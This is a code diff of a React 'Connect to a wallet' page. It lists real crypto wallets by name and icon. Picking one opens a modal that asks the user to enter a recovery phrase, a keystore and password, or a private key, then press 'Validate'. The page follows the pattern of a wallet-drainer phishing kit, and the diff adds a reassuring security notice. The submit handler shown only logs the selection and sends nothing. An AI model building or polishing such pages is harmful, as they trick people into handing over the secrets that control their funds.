@@ -1,26 +1,57 @@
 import { useState } from "react";
 import { ArrowLeft, Check, Loader2 } from "lucide-react";
+import {
+  WalletMetamask,
+  WalletTrust,
+  WalletPhantom,
+  WalletCoinbase,
+  WalletRabby,
+  WalletRainbow,
+  WalletArgent,
+  WalletExodus,
+  WalletTrezor,
+  WalletLedger,
+  WalletSafe,
+  WalletOkx,
+  WalletZerion,
+  WalletKraken,
+  WalletCoin98,
+  WalletAtomic,
+  WalletZengo,
+  WalletSolflare,
+  WalletTokenPocket,
+  WalletKeplr,
+  WalletImtoken,
+  WalletAlphaWallet,
+  WalletWalletConnect,
+} from "@web3icons/react";
 
-type Wallet = {
-  name: string;
-  logo: string;
-  logoClass: string;
-};
 
-const wallets: Wallet[] = [
-  { name: "Metamask", logo: "🦊", logoClass: "text-orange-500" },
-  { name: "Trust", logo: "T", logoClass: "text-blue-500" },
-  { name: "Ambire", logo: "A", logoClass: "text-purple-500" },
-  { name: "ApolloX", logo: "X", logoClass: "text-blue-600" },
-  { name: "Argent", logo: "A", logoClass: "text-slate-800" },
-  { name: "Avalanche", logo: "▲", logoClass: "text-red-500" },
-  { name: "Banner", logo: "B", logoClass: "text-violet-500" },
-  { name: "BitKeep", logo: "B", logoClass: "text-cyan-500" },
-  { name: "Bitski", logo: "B", logoClass: "text-pink-500" },
-  { name: "Blockchain", logo: "▣", logoClass: "text-blue-500" },
-  { name: "BSC", logo: "◆", logoClass: "text-yellow-500" },
+const wallets = [
+  { name: "MetaMask", icon: WalletMetamask },
+  { name: "Trust Wallet", icon: WalletTrust },
+  { name: "Phantom", icon: WalletPhantom },
+  { name: "Coinbase Wallet", icon: WalletCoinbase },
+  { name: "Rabby", icon: WalletRabby },
+  { name: "Rainbow", icon: WalletRainbow },
+  { name: "Argent", icon: WalletArgent },
+  { name: "Exodus", icon: WalletExodus },
+  { name: "Trezor", icon: WalletTrezor },
+  { name: "Ledger", icon: WalletLedger },
+  { name: "Safe", icon: WalletSafe },
+  { name: "OKX Wallet", icon: WalletOkx },
+  { name: "Zerion", icon: WalletZerion },
+  { name: "Kraken Wallet", icon: WalletKraken },
+  { name: "Coin98", icon: WalletCoin98 },
+  { name: "Atomic Wallet", icon: WalletAtomic },
+  { name: "Zengo", icon: WalletZengo },
+  { name: "Solflare", icon: WalletSolflare },
+  { name: "TokenPocket", icon: WalletTokenPocket },
+  { name: "Keplr", icon: WalletKeplr },
+  { name: "imToken", icon: WalletImtoken },
+  { name: "AlphaWallet", icon: WalletAlphaWallet },
+  { name: "WalletConnect", icon: WalletWalletConnect },
 ];
-
 type Tab = "phrase" | "keystore" | "privateKey";
 
 export default function WalletConnectionPage() {
@@ -34,21 +65,47 @@ export default function WalletConnectionPage() {
 
   const [selectedTab, setSelectedTab] = useState<Tab>("phrase");
 
-  const handleWalletClick = (walletName: string) => {
-    setConnectingWallet(walletName);
+  // Demo input state
+  const [phraseInput, setPhraseInput] = useState("");
+  const [keystoreInput, setKeystoreInput] = useState("");
+  const [passwordInput, setPasswordInput] = useState("");
+  const [privateKeyInput, setPrivateKeyInput] = useState("");
 
-    setTimeout(() => {
-      setConnectingWallet(null);
-      setSelectedWallet(walletName);
-      setSelectedTab("phrase");
-      setIsModalOpen(true);
-    }, 2000);
+  const handleWalletClick = (walletName: string) => {
+    setConnectingWallet(null);
+    setSelectedWallet(walletName);
+    setSelectedTab("phrase");
+
+    setPhraseInput("");
+    setKeystoreInput("");
+    setPasswordInput("");
+    setPrivateKeyInput("");
+
+    setIsModalOpen(true);
   };
 
   const handleClose = () => {
     setIsModalOpen(false);
     setSelectedWallet(null);
+    setConnectingWallet(null);
   };
+
+  const handleValidate = () => {
+  console.log("Selected wallet:", selectedWallet);
+  console.log("Selected tab:", selectedTab);
+
+  if (selectedTab === "phrase") {
+    console.log("Phrase tab selected");
+  }
+
+  if (selectedTab === "keystore") {
+    console.log("Keystore tab selected");
+  }
+
+  if (selectedTab === "privateKey") {
+    console.log("Private key tab selected");
+  }
+};
 
   return (
     <main className="min-h-screen bg-[#030712] px-5 py-10 text-white sm:px-8 lg:px-12">
@@ -73,12 +130,11 @@ export default function WalletConnectionPage() {
 
         {/* Main wallet panel */}
         <div className="rounded-[14px] bg-[#f8fafc] p-5 shadow-[0_25px_80px_rgba(0,0,0,0.35)] sm:p-8 lg:p-10">
-          {/* Panel heading */}
           <h2 className="mb-7 text-2xl font-semibold text-slate-800">
             Connect to a wallet
           </h2>
 
-          {/* Scrollable wallet list */}
+          {/* Wallet list */}
           <div
             className="
               max-h-[590px]
@@ -94,49 +150,45 @@ export default function WalletConnectionPage() {
             "
           >
             {wallets.map((wallet) => {
-              const isConnecting = connectingWallet === wallet.name;
+  const isConnecting = connectingWallet === wallet.name;
 
-              return (
-                <button
-                  key={wallet.name}
-                  type="button"
-                  onClick={() => handleWalletClick(wallet.name)}
-                  disabled={connectingWallet !== null}
-                  className="group flex min-h-[70px] w-full items-center justify-between rounded-xl border border-slate-200 bg-white px-5 transition-all duration-200 hover:border-blue-300 hover:bg-slate-50 hover:shadow-[0_4px_18px_rgba(37,99,235,0.08)] disabled:cursor-default"
-                >
-                  {/* Left side */}
-                  <div className="flex min-w-0 items-center gap-4">
-                    {/* Available indicator */}
-                    <span className="relative flex h-3 w-3 shrink-0">
-                      <span className="absolute inset-0 rounded-full bg-emerald-400 opacity-30" />
-                      <span className="relative h-3 w-3 rounded-full bg-emerald-500" />
-                    </span>
+  return (
+    <button
+      key={wallet.name}
+      type="button"
+      onClick={() => handleWalletClick(wallet.name)}
+      className="group flex min-h-[70px] w-full items-center justify-between rounded-xl border border-slate-200 bg-white px-5 transition-all duration-200 hover:border-blue-300 hover:bg-slate-50 hover:shadow-[0_4px_18px_rgba(37,99,235,0.08)]"
+    >
+      <div className="flex min-w-0 items-center gap-4">
+        <span className="relative flex h-3 w-3 shrink-0">
+          <span className="absolute inset-0 rounded-full bg-emerald-400 opacity-30" />
+          <span className="relative h-3 w-3 rounded-full bg-emerald-500" />
+        </span>
 
-                    {/* Wallet name / loading state */}
-                    {isConnecting ? (
-                      <div className="flex items-center gap-3">
-                        <Loader2 className="h-4 w-4 animate-spin text-blue-500" />
+        {isConnecting ? (
+          <div className="flex items-center gap-3">
+            <Loader2 className="h-4 w-4 animate-spin text-blue-500" />
 
-                        <span className="text-[16px] font-medium text-slate-700">
-                          Connecting to {wallet.name}...
-                        </span>
-                      </div>
-                    ) : (
-                      <span className="truncate text-[16px] font-medium text-slate-700">
-                        {wallet.name}
-                      </span>
-                    )}
-                  </div>
+            <span className="text-[16px] font-medium text-slate-700">
+              Connecting to {wallet.name}...
+            </span>
+          </div>
+        ) : (
+          <span className="truncate text-[16px] font-medium text-slate-700">
+            {wallet.name}
+          </span>
+        )}
+      </div>
 
-                  {/* Wallet logo */}
-                  <div
-                    className={`ml-4 flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-slate-100 text-xl font-bold ${wallet.logoClass}`}
-                  >
-                    {wallet.logo}
-                  </div>
-                </button>
-              );
-            })}
+      <div className="ml-4 flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-slate-100">
+        <wallet.icon
+          size={30}
+          variant="branded"
+        />
+      </div>
+    </button>
+  );
+})}
           </div>
 
           {/* Small status message */}
@@ -147,10 +199,7 @@ export default function WalletConnectionPage() {
         </div>
       </div>
 
-      {/* ========================================================= */}
       {/* CONNECT WALLET MODAL */}
-      {/* ========================================================= */}
-
       {isModalOpen && selectedWallet && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#02002d]/80 px-4 backdrop-blur-[1px]">
           <div
@@ -167,7 +216,7 @@ export default function WalletConnectionPage() {
 
             {/* Wallet title */}
             <h2 className="mb-5 text-center text-[13px] font-semibold text-slate-800">
-              Import your {selectedWallet} wallet
+              Connect your {selectedWallet} wallet
             </h2>
 
             {/* Tabs */}
@@ -186,6 +235,7 @@ export default function WalletConnectionPage() {
                 {selectedTab === "phrase" && (
                   <span className="absolute bottom-[-1px] left-0 right-0 h-[2px] bg-[#00d9a5]" />
                 )}
+
               </button>
 
               <button
@@ -221,58 +271,64 @@ export default function WalletConnectionPage() {
               </button>
             </div>
 
-            
+            {/* Tab content */}
             <div className="mt-4 space-y-3">
               {selectedTab === "phrase" && (
                 <textarea
-                
-                  placeholder="Enter your recovery phrase"
-                  className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none placeholder:text-slate-400"
+                  aria-label="input"
+                  placeholder="Enter your phrase"
+                  value={phraseInput}
+                  onChange={(e) => setPhraseInput(e.target.value)}
+                  className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none"
                 />
               )}
 
               {selectedTab === "keystore" && (
                 <>
                   <textarea
-                   
+                    aria-label="keystore input"
                     placeholder="Enter your keystore"
-                    className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none placeholder:text-slate-400"
+                    value={keystoreInput}
+                    onChange={(e) => setKeystoreInput(e.target.value)}
+                    className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none"
                   />
 
-                  <input
-                   
-                    type="text"
-                    placeholder="wallet password"
-                    className="h-[38px] w-full rounded-[5px] border border-slate-400 bg-white px-2 text-[12px] outline-none placeholder:text-slate-400"
+                  <textarea
+                    
+                    aria-label="password input"
+                    placeholder="Enter your password"
+                    value={passwordInput}
+                    onChange={(e) => setPasswordInput(e.target.value)}
+                    className="h-[38px] w-full rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] outline-none"
                   />
                 </>
               )}
 
               {selectedTab === "privateKey" && (
                 <textarea
-                
-                  placeholder="Enter your privateKey"
-                  className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none placeholder:text-slate-400"
+                  aria-label="private key input"
+                  placeholder="Enter your private key"
+                  value={privateKeyInput}
+                  onChange={(e) => setPrivateKeyInput(e.target.value)}
+                  className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none"
                 />
               )}
             </div>
 
-         
+            {/* Notice area */}
             <div className="mt-3 rounded-[4px] border border-amber-200 bg-amber-50 px-3 py-2">
               <p className="text-[10px] leading-4 text-amber-700">
-                
+                For security, use your connected wallet to approve requests.
               </p>
             </div>
 
             {/* Validate */}
             <button
               type="button"
-            //   onClick={() => {
-            //     alert(".");
-            //   }}
+              onClick={handleValidate}
               className="mt-4 h-[38px] w-full rounded-[3px] bg-[#15158f] text-[12px] font-bold text-white transition hover:bg-[#101075]"
             >
-              Validate 
+              Validate
             </button>
 
             {/* Close */}
